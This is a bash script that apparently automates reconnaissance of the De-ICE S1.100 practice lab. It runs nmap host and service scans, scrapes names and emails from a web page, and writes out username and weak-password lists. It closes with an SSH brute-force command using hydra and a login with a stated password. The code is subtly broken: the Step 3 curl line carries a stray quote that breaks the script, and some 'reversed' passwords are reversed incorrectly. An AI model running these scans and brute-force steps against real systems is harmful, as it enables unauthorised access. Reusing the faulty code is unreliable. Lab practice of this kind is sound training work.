#!/bin/bash

# De-ICE S1.100 Reconnaissance Script
echo "=== De-ICE S1.100 Reconnaissance ==="
echo "Target: Lab network (10.10.8.0/24)"
echo ""

echo "[+] Step 1: Network Discovery"
echo "nmap -sn 10.10.8.0/24"
nmap -sn 10.10.8.0/24
echo ""

echo "[+] Step 2: Port Scanning Discovered Hosts"  
echo "nmap -sC -sV 10.10.8.2 10.10.8.10 10.10.8.11 10.10.8.12 10.10.8.13"
nmap -sC -sV 10.10.8.2 10.10.8.10 10.10.8.11 10.10.8.12 10.10.8.13
echo ""

echo "[+] Step 3: Web Enumeration"
echo "curl -s http://10.10.8.12 | grep -E '(Name|Email)'"
curl -s http://10.10.8.12 | grep -E '(Name|Email)'"
echo ""

echo "[+] Step 4: Generate Username List"
cat > /root/lab/users.txt << 'EOF'
aadams
bbanter  
ccoffee
ddeeds
eeikman
root
admin
EOF
echo "Created users.txt with potential usernames"

echo "[+] Step 5: Generate Password List"
cat > /root/lab/passwords.txt << 'EOF'
password
password123
123456
admin
root
aadams
bbanter
ccoffee
ddeeds
eeikman
smadaa
retnabtb
eeffocc
sdeedd
namkie
company
deice
2003
2004
security
welcome
letmein
EOF
echo "Created passwords.txt with common weak passwords"

echo ""
echo "=== Ready for Exploitation ==="
echo "Next steps:"
echo "1. FTP enumeration: ftp 10.10.8.11"
echo "2. SSH brute force: hydra -L users.txt -P passwords.txt 10.10.8.10 ssh"
echo "3. SSH access: ssh aadams@10.10.8.10 (password: nostaw)"